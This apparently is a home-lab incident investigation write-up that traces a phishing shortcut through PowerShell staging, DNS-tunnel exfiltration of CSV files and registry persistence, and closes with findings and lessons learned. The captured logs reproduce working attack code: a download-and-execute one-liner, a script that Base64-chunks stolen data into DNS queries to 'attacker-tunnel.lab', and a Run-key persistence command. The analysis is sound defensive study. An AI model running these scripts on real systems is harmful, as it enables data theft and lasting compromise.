+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre>
+<p dir="auto"><em>Artifact 3: Parent process creation</em></p>
+</div></div></div><div class="el-h6"><h6 data-heading="3.2 Execution Chain" dir="auto" class="heading" id="3.2_Execution_Chain_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>3.2 Execution Chain</h6></div><div class="el-p"><p dir="auto">After the user opened <code>Q3_Bonus_Payout.pdf.lnk</code>, a series of PowerShell scripts executed in the background, ultimately leading to data exfiltration and persistence.</p></div><div class="el-ol"><ol>
+<li data-line="0" dir="auto"><span class="list-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span><strong>Phase 1 - Staging</strong>
+<ul class="has-list-bullet">
+<li data-line="1" dir="auto"><span class="list-bullet"></span>Downloads the main payload (<code>exfil.ps1</code>) to the disk and executes it in a new process.</li>
+<li data-line="2" dir="auto"><span class="list-bullet"></span>Deletes <code>exfil.ps1</code> from the disk to evade detection once execution is completed.</li>
+</ul>
+</li>
+<li data-line="4" dir="auto"><span class="list-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span><strong>Phase 2 - Exfiltration</strong>
+<ul class="has-list-bullet">
+<li data-line="5" dir="auto"><span class="list-bullet"></span>Collects all <code>.csv</code> files in the specified path and compresses them into a single <code>.zip</code> archive.</li>
+<li data-line="6" dir="auto"><span class="list-bullet"></span>Encodes the <code>.zip</code> archive into Base64 strings and exfiltrates the data in chunks using DNS queries.</li>
+</ul>
+</li>
+<li data-line="8" dir="auto"><span class="list-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span><strong>Phase 3 - Discovery &amp; Persistence</strong>
+<ul class="has-list-bullet">
+<li data-line="9" dir="auto"><span class="list-bullet"></span>Executes <code>whoami</code> and <code>ipconfig /all</code> to gather host and network information.</li>
+<li data-line="10" dir="auto"><span class="list-bullet"></span>Adds a registry key (<code>HKCU\...\Run</code>) that triggers a hidden PowerShell task upon user login.</li>
+</ul>
+</li>
+</ol></div><div class="el-div"><div data-callout-metadata="" data-callout-fold="-" data-callout="cmd" class="callout is-collapsible is-collapsed"><div class="callout-title" dir="auto"><div class="callout-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-terminal"><path d="M12 19h8"></path><path d="m4 17 6-6-6-6"></path></svg></div><div class="callout-title-inner">Phase 1 - Staging</div><div class="callout-fold is-collapsed"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-chevron-down"><path d="m6 9 6 6 6-6"></path></svg></div></div><div class="callout-content" style="display: none;">
+<p dir="auto">The file that was downloaded by the <code>.lnk</code> shortcut, downloaded <code>exfil.ps1</code> on disk, and executed it with <code>-NoProfile -ExecutionPolicy Bypass</code>. Empty path is expected because the parent process is running in memory using the <code>IEX</code> command.</p>
+<p dir="auto"><span alt="Pasted image 20260912210901.png" src="_files/pasted-image-20260912210901.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20260912210901.png" src="_files/pasted-image-20260912210901.png" target="_self"></span></p>
+<pre class="language-powershell"><code data-line="5" class="language-powershell is-loaded"><span class="token keyword">data</span><span class="token punctuation">.</span>win<span class="token punctuation">.</span>system<span class="token punctuation">.</span>processID: 16900
+<span class="token keyword">data</span><span class="token punctuation">.</span>win<span class="token punctuation">.</span>system<span class="token punctuation">.</span>message: 	<span class="token string">"Creating Scriptblock text (1 of 1):
+<span class="token variable">$PayloadUrl</span> = "</span>https:<span class="token operator">/</span><span class="token operator">/</span>raw<span class="token punctuation">.</span>githubusercontent<span class="token punctuation">.</span>com/Jamilosa/Cybersecurity-Lab-Configurations/main/scripts/exfil<span class="token punctuation">.</span>ps1<span class="token string">"
+<span class="token variable">$TempPath</span> = "</span><span class="token variable">$env</span>:TEMP\exfil<span class="token punctuation">.</span>ps1<span class="token string">"
+
+Invoke-WebRequest -Uri <span class="token variable">$PayloadUrl</span> -OutFile <span class="token variable">$TempPath</span>
+&amp; powershell.exe -NoProfile -ExecutionPolicy Bypass -File <span class="token variable">$TempPath</span>
+Remove-Item <span class="token variable">$TempPath</span> -ErrorAction SilentlyContinue
+
+ScriptBlock ID: 1a95a8ed-0833-435e-8f63-33625a75ff4d
+Path: "</span>
+
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre>
+<p dir="auto">A Sysmon File Creation (Event ID 11) captured that <code>exfil.ps1</code> was created on the user's temp folder with the same PID (<code>16900</code>) as the <code>powershell.exe</code> spawned by <code>explorer.exe</code>.</p>
+<p dir="auto"><span alt="Pasted image 20260912213647.png" src="_files/pasted-image-20260912213647.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20260912213647.png" src="_files/pasted-image-20260912213647.png" target="_self"></span></p>
+<pre class="language-powershell"><code data-line="24" class="language-powershell is-loaded"><span class="token keyword">data</span><span class="token punctuation">.</span>win<span class="token punctuation">.</span>system<span class="token punctuation">.</span>message: "File created:
+ProcessId: 16900
+Image: C:\WINDOWS\System32\WindowsPowerShell\v1<span class="token punctuation">.</span>0\powershell<span class="token punctuation">.</span>exe
+TargetFilename: C:\Users\jamilosa\AppData\Local\Temp\exfil<span class="token punctuation">.</span>ps1
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre>
+<p dir="auto">Then, Sysmon Process Create (Event ID 1) captured <code>powershell.exe</code> executing <code>exfil.ps1</code> with PID <code>2000</code> and Parent PID <code>16900</code>. Interestingly, the current directory still points to the <code>Q3_Bonus_Payout</code> folder where the <code>.lnk</code> was executed.</p>
+<pre class="language-powershell"><code data-line="33" class="language-powershell is-loaded">ProcessId: 2000
+CommandLine: <span class="token string">"C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"</span> <span class="token operator">-</span>NoProfile <span class="token operator">-</span>ExecutionPolicy Bypass <span class="token operator">-</span>File C:\Users\jamilosa\AppData\Local\Temp\exfil<span class="token punctuation">.</span>ps1
+CurrentDirectory: C:\Users\jamilosa\Downloads\Q3_Bonus_Payout\
+ParentProcessId: 16900
+ParentImage: C:\Windows\System32\WindowsPowerShell\v1<span class="token punctuation">.</span>0\powershell<span class="token punctuation">.</span>exe
+ParentCommandLine: <span class="token string">"C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"</span> <span class="token operator">-</span>WindowStyle Hidden <span class="token operator">-</span>ExecutionPolicy Bypass <span class="token operator">-</span>Command <span class="token string">"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Jamilosa/Cybersecurity-Lab-Configurations/main/scripts/stage1_exfil.ps1')"</span>
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre>
+</div></div></div><div class="el-div"><div data-callout-metadata="" data-callout-fold="+" data-callout="cmd" class="callout is-collapsible"><div class="callout-title" dir="auto"><div class="callout-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-terminal"><path d="M12 19h8"></path><path d="m4 17 6-6-6-6"></path></svg></div><div class="callout-title-inner">Phase 2 - Exfiltration</div><div class="callout-fold"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-chevron-down"><path d="m6 9 6 6 6-6"></path></svg></div></div><div class="callout-content">
+<p dir="auto">A PowerShell Script Block (Event ID 4104) captured PID <code>2000</code> piped command that lists all <code>.csv</code> files on a <code>$SourcePath</code> variable then compresses it as <code>$TempStaging</code> variable.   </p>
+<p dir="auto"><span alt="Pasted image 20260912211048.png" src="_files/pasted-image-20260912211048.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20260912211048.png" src="_files/pasted-image-20260912211048.png" target="_self"></span></p>
+<pre class="language-powershell"><code data-line="5" class="language-powershell is-loaded"><span class="token keyword">data</span><span class="token punctuation">.</span>win<span class="token punctuation">.</span>system<span class="token punctuation">.</span>processID: 2000
+<span class="token keyword">data</span><span class="token punctuation">.</span>win<span class="token punctuation">.</span>system<span class="token punctuation">.</span>message: <span class="token string">"Creating Scriptblock text (1 of 1):
+Get-ChildItem -Path <span class="token variable">$SourcePath</span> -Filter *.csv -Recurse | Compress-Archive -DestinationPath <span class="token variable">$TempStaging</span> -Force
+
+ScriptBlock ID: 50cdd302-ec9e-45dd-88fd-b6c81760d6e8
+Path: "</span>
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre>
+<p dir="auto">To better understand the attack and identify its blast radius. I searched through archived logs for pattern that matches known fields such as Event ID, PID, and a portion of the timestamp.</p>
+<pre class="language-bash"><code data-line="15" class="language-bash is-loaded"><span class="token function">gzip</span> <span class="token parameter variable">-dk</span> ossec-archive-12.log.gz 
+<span class="token function">cat</span> ossec-archive-12.log <span class="token parameter variable">-n</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"4104"</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"2000"</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"Sep 12 12:0"</span> 
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre>
+<p dir="auto">After scanning through the results, I was able to obtain the PowerShell Script Block (4104) for the <code>exfil.ps1</code> script. This helped me identify that target <code>$SourcePath</code> variable was <code>~/Documents/Data/Datasets</code>. </p>
+<pre class="language-json"><code data-line="21" class="language-json is-loaded"><span class="token number">51652</span> <span class="token number">2026</span> Sep <span class="token number">12</span> <span class="token number">12</span><span class="token operator">:</span><span class="token number">01</span><span class="token operator">:</span><span class="token number">08</span> 
+eventID<span class="token operator">:</span><span class="token string">"4104"</span>
+processID<span class="token operator">:</span><span class="token string">"2000"</span>
+threadID<span class="token operator">:</span><span class="token string">"6488"</span>
+scriptBlockText<span class="token operator">:</span>"$SourcePath  = \\\"$env<span class="token operator">:</span>USERPROFILE\\\\Documents\\\\Data\\\\Datasets\\\" $TempStaging = \\\"$env<span class="token operator">:</span>TEMP\\\\staged_data.zip\\\" $TargetDNS   = \\\"<span class="token number">172.16</span>.<span class="token number">0.1</span>\\\" $FakeDomain  = \\\"attacker-tunnel.lab\\\"  Write-Host \\\"<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Enumerating and archiving target CSV data...\\\"  # --- MALWARE EVASION TECHNIQUE<span class="token operator">:</span> BASE64 COMMAND ENCODING --- # Encoded command<span class="token operator">:</span> Get-ChildItem -Path $SourcePath -Filter *.csv -Recurse | Compress-Archive -DestinationPath $TempStaging -Force $EncodedPayload = \\\"R2V0LUNoaWxkSXRlbSAtUGF0aCAkU291cmNlUGF0aCAtRmlsdGVyICouY3N2IC1SZWN1cnNlIHwgQ29tcHJlc3MtQXJjaGl2ZSAtRGVzdGluYXRpb25QYXRoICRUZW1wU3RhZ2luZyAtRm9yY2U=\\\"  if (Test-Path $SourcePath) <span class="token punctuation">{</span>     # Decode and execute in memory (T1140 &amp;amp; T1059)     $DecodedCmd = <span class="token punctuation">[</span>System.Text.Encoding<span class="token punctuation">]</span><span class="token operator">:</span><span class="token operator">:</span>UTF8.GetString(<span class="token punctuation">[</span>System.Convert<span class="token punctuation">]</span><span class="token operator">:</span><span class="token operator">:</span>FromBase64String($EncodedPayload))     IEX $DecodedCmd <span class="token punctuation">}</span> else <span class="token punctuation">{</span>     Write-Host \\\"<span class="token punctuation">[</span>!<span class="token punctuation">]</span> Target directory not found. Creating dummy data...\\\"     \\\"TransactionID<span class="token punctuation">,</span>Customer<span class="token punctuation">,</span>Amount`n1001<span class="token punctuation">,</span>DemoUser<span class="token punctuation">,</span><span class="token number">250.00</span>\\\" | Out-File -FilePath \\\"$env<span class="token operator">:</span>TEMP\\\\dummy.csv\\\" -Encoding utf8     $DummyEncode = \\\"Q29tcHJlc3MtQXJjaGl2ZSAtUGF0aCAiJGVudjpURU1QXGR1bW15LmNzdiIgLURlc3RpbmF0aW9uUGF0aCAkVGVtcFN0YWdpbmcgLUZvcmNl\\\"     $DecodedCmd = <span class="token punctuation">[</span>System.Text.Encoding<span class="token punctuation">]</span><span class="token operator">:</span><span class="token operator">:</span>UTF8.GetString(<span class="token punctuation">[</span>System.Convert<span class="token punctuation">]</span><span class="token operator">:</span><span class="token operator">:</span>FromBase64String($DummyEncode))     IEX $DecodedCmd <span class="token punctuation">}</span>  Write-Host \\\"<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Preparing <span class="token number">45</span>-character Base64 chunks for exfiltration...\\\" $RawBytes = <span class="token punctuation">[</span>System.IO.File<span class="token punctuation">]</span><span class="token operator">:</span><span class="token operator">:</span>ReadAllBytes($TempStaging) $Base64Data = <span class="token punctuation">[</span>Convert<span class="token punctuation">]</span><span class="token operator">:</span><span class="token operator">:</span>ToBase64String($RawBytes)  $ChunkSize = <span class="token number">45</span> $Chunks = <span class="token punctuation">[</span>regex<span class="token punctuation">]</span><span class="token operator">:</span><span class="token operator">:</span>Matches($Base64Data<span class="token punctuation">,</span> \\\".<span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span>$ChunkSize<span class="token punctuation">}</span>\\\") | ForEach-Object <span class="token punctuation">{</span> $_.Value <span class="token punctuation">}</span>  Write-Host \\\"<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Transmitting payload via DNS NULL queries (Max <span class="token number">30</span> Chunks)...\\\" $Counter = <span class="token number">1</span> foreach ($Chunk in $Chunks) <span class="token punctuation">{</span>     if ($Counter -gt <span class="token number">30</span>) <span class="token punctuation">{</span>         Write-Host \\\"<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">30</span>-chunk testing limit reached. Halting transmission.\\\"         break     <span class="token punctuation">}</span>      # Sanitize the Base64 string for valid DNS characters     $SafeChunk = $Chunk -replace '\\\\+'<span class="token punctuation">,</span> '-' -replace '/'<span class="token punctuation">,</span> '_' -replace '='<span class="token punctuation">,</span> ''      # FORMAT<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">45</span>-Char-Base64<span class="token punctuation">]</span>.seq<span class="token punctuation">[</span>Counter<span class="token punctuation">]</span>.attacker-tunnel.lab     $QueryFQDN = \\\"$SafeChunk.seq$Counter.$FakeDomain\\\"     Resolve-DnsName -Name $QueryFQDN -Type NULL -Server $TargetDNS -QuickTimeout -ErrorAction SilentlyContinue | Out-Null      $Counter++     Start-Sleep -Milliseconds <span class="token number">100</span> <span class="token punctuation">}</span>  Write-Host \\\"<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Cleaning up artifacts...\\\" if (Test-Path $TempStaging) <span class="token punctuation">{</span> Remove-Item -Path $TempStaging -Force <span class="token punctuation">}</span>  Write-Host \\\"<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Exfiltration complete. Establishing persistence and executing recon...\\\"  # Download and execute the persistence payload in memory $PersistUrl = \\\"https<span class="token operator">:</span><span class="token comment">//raw.githubusercontent.com/Jamilosa/Cybersecurity-Lab-Configurations/main/scripts/persist_code.ps1\\\" IEX (Invoke-RestMethod -Uri $PersistUrl)</span>
+path<span class="token operator">:</span><span class="token string">"C:\\\\Users\\\\jamilosa\\\\AppData\\\\Local\\\\Temp\\\\exfil.ps1"</span>
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre>
+<p dir="auto">The anomalous DNS traffic also matched my custom firewall (<code>dnsmasq</code>) rule and trigger alerts for the NULL queries to <code>attacker-tunnel.lab</code> generated by the <code>Resolve-DnsName</code>. Interestingly, the first DNS FQDN query contains <code>UEsDBBQAAAAIA</code> which is a starting string of a <code>.zip</code> file encoded in <code>Base64</code>.</p>
+<p dir="auto"><span alt="Pasted image 20260912214847.png" src="_files/pasted-image-20260912214847.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20260912214847.png" src="_files/pasted-image-20260912214847.png" target="_self"></span></p>
+<pre><code data-line="34">data.srcip: 10.0.0.50
+data.dns_action: query[NULL]
+data.url: UEsDBBQAAAAIAIib9FyEVQNr3QgAAHg1AAAiAAAANSBtb.seq1.attacker-tunnel.lab
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre>
+<p dir="auto"><span alt="Pasted image 20260912220315.png" src="_files/pasted-image-20260912220315.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20260912220315.png" src="_files/pasted-image-20260912220315.png" target="_self"></span></p>
+<pre><code data-line="42">data.srcip: 10.0.0.50
+data.dns_action: query[NULL]
+data.url: AAii78Td4zxbdYWE3M_-vNFS_DPL5DAtA8q5mfxENQUc6.seq29.attacker-tunnel.lab
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre>
+</div></div></div><div class="el-div"><div data-callout-metadata="" data-callout-fold="-" data-callout="cmd" class="callout is-collapsible is-collapsed"><div class="callout-title" dir="auto"><div class="callout-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-terminal"><path d="M12 19h8"></path><path d="m4 17 6-6-6-6"></path></svg></div><div class="callout-title-inner">Phase 3 - Discovery &amp; Persistence</div><div class="callout-fold is-collapsed"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-chevron-down"><path d="m6 9 6 6 6-6"></path></svg></div></div><div class="callout-content" style="display: none;">
+<p dir="auto">Script Block Logging captured PID <code>2000</code>'s execution of <code>whoami</code> and <code>ipconfig /all</code> to collect user and network information that can be used by other scripts to execute different attacks. It also modified a registry <code>HK_Current_User\...\Run</code>  to automatically run a PowerShell task on user login.  </p>
+<pre class="language-powershell"><code data-line="2" class="language-powershell is-loaded"><span class="token keyword">data</span><span class="token punctuation">.</span>win<span class="token punctuation">.</span>system<span class="token punctuation">.</span>processID: 2000
+<span class="token keyword">data</span><span class="token punctuation">.</span>win<span class="token punctuation">.</span>system<span class="token punctuation">.</span>message: <span class="token string">"Creating Scriptblock text (1 of 1):
+whoami
+ipconfig /all
+# Payload: Write-Host 'hello!'
+<span class="token variable">$EncodedPayload</span> = "</span>VwByAGkAdABlAC0ASABvAHMAdAAgACcAaABlAGwAbABvACEAJwA=<span class="token string">"
+<span class="token variable">$TaskCommand</span> = "</span>powershell<span class="token punctuation">.</span>exe <span class="token operator">-</span>WindowStyle Hidden <span class="token operator">-</span>ExecutionPolicy Bypass <span class="token operator">-</span>EncodedCommand <span class="token variable">$EncodedPayload</span><span class="token string">"
+Set-ItemProperty -Path "</span>HKCU:\Software\Microsoft\Windows\CurrentVersion\Run<span class="token string">" -Name "</span>persistent_task_demo<span class="token string">" -Value <span class="token variable">$TaskCommand</span> -Force
+
+ScriptBlock ID: 02fa569e-77e0-4024-8a20-7b1b01b1d2d5
+Path: "</span>
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre>
+<p dir="auto">The last script added the registry key <code>persistence_task_demo</code> on <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code> with the value of <code>$TaskCommand</code> in the previous alert snippet.<br>
+<span alt="Pasted image 20260913161309.png" src="_files/pasted-image-20260913161309.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20260913161309.png" src="_files/pasted-image-20260913161309.png" target="_self"></span></p>
+<p dir="auto">After the persistence was deployed. The process tree goes back to PID <code>16900</code> (<code>stage1_exfil_ps1</code>) and executed the remaining PowerShell script which Sysmon captured and logged File Delete Archived (Event ID 23) as it cleaned the <code>exfil.ps1</code> script. </p>
+<pre class="language-json"><code data-line="20" class="language-json is-loaded"><span class="token number">62315</span>  <span class="token number">2026</span> Sep <span class="token number">12</span> <span class="token number">12</span><span class="token operator">:</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">52</span>
+eventID<span class="token operator">:</span><span class="token string">"23"</span>
+message<span class="token operator">:</span>"File Delete archived
+
+ProcessId<span class="token operator">:</span> <span class="token string">"16900"</span>
+Image<span class="token operator">:</span> <span class="token string">"C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"</span>
+TargetFilename<span class="token operator">:</span> <span class="token string">"C:\\Users\\jamilosa\\AppData\\Local\\Temp\\exfil.ps1"</span>
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre>
+</div></div></div><div class="el-div"><div data-callout-metadata="" data-callout-fold="-" data-callout="cmd" class="callout is-collapsible is-collapsed"><div class="callout-title" dir="auto"><div class="callout-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-terminal"><path d="M12 19h8"></path><path d="m4 17 6-6-6-6"></path></svg></div><div class="callout-title-inner">Investigation Notes</div><div class="callout-fold is-collapsed"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-chevron-down"><path d="m6 9 6 6 6-6"></path></svg></div></div><div class="callout-content" style="display: none;">
+<p dir="auto"><strong>Event Viewer</strong><br>
+I also performed investigation on the Event Viewer to look for any PowerShell Script Block events that did not match Wazuh rules. Unfortunately, Only the last <code>4104</code> (discovery and persistence) related to the attack was available because PowerShell operational logs reached its capacity limit and started to rotate the logs including other event <code>4104</code> artifacts.<br>
+<span alt="Pasted image 20260913095732.png" src="_files/pasted-image-20260913095732.png" class="internal-embed media-embed image-embed is-loaded" target="_self" style="width: 300px; max-width: 100%;"><img alt="Pasted image 20260913095732.png" src="_files/pasted-image-20260913095732.png" target="_self" style="width: 300px; max-width: 100%;"></span></p>
+<p dir="auto">This shifted the log retrieval process to the Wazuh Manager's archived logs.</p>
+</div></div></div><div class="el-h5"><h5 data-heading="IV. Findings" dir="auto" class="heading" id="IV._Findings_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>IV. Findings</h5></div><div class="el-ul"><ul class="has-list-bullet">
+<li data-line="0" dir="auto"><span class="list-bullet"></span>The adversary used a masqueraded <code>.lnk</code> shortcut file delivered likely via phishing, which initiated the attack upon user interaction.</li>
+<li data-line="1" dir="auto"><span class="list-bullet"></span>The threat actor initiated the stager entirely in memory, obfuscating some payloads with Base64 encoding, and deleting staging files from the disk once they were executed.</li>
+<li data-line="2" dir="auto"><span class="list-bullet"></span>Host reconnaissance and collection were highly targeted. The script specifically enumerated and compressed <code>.csv</code> files located within the user's <code>~\Documents\Data\Datasets</code> directory, limiting the immediate blast radius to that specific dataset.</li>
+<li data-line="3" dir="auto"><span class="list-bullet"></span>Data was successfully transmitted outside by chunking the compressed archive into Base64 strings and tunneling it through DNS <code>NULL</code> queries.</li>
+<li data-line="4" dir="auto"><span class="list-bullet"></span>The attacker deployed persistence by modifying the <code>HKCU\...\Run</code> registry key, ensuring their payload would re-execute upon subsequent user login.</li>
+</ul></div><div class="el-p"><p dir="auto"><strong>V. Lessons Learned</strong></p></div><div class="el-ul"><ul class="has-list-bullet">
+<li data-line="0" dir="auto"><span class="list-bullet"></span>Wazuh cannot flag every malicious event, defenders must also be able to investigate events that do not generate alerts by using the context available across logs, processes, and endpoint artifacts. </li>
+<li data-line="1" dir="auto"><span class="list-bullet"></span>Cyber attacks usually goes through multiple phases to avoid detections and perform advanced exploitations, these also create multiple opportunities for defenders to thwart the intrusion and prevent further compromise.</li>
+<li data-line="2" dir="auto"><span class="list-bullet"></span>Attackers can use <code>sleep</code> to delay malware executions to prevent noticeable security alert spikes and closely tied alerts. This requires the defenders to rely on <code>PID/PPID</code>/<code>GUID</code> to map process execution chains.</li>
+<li data-line="3" dir="auto"><span class="list-bullet"></span>PowerShell Script Block Logging (4104) was able to capture a Base64-encoded payload (collection and archiving) after it was decoded during execution.</li>
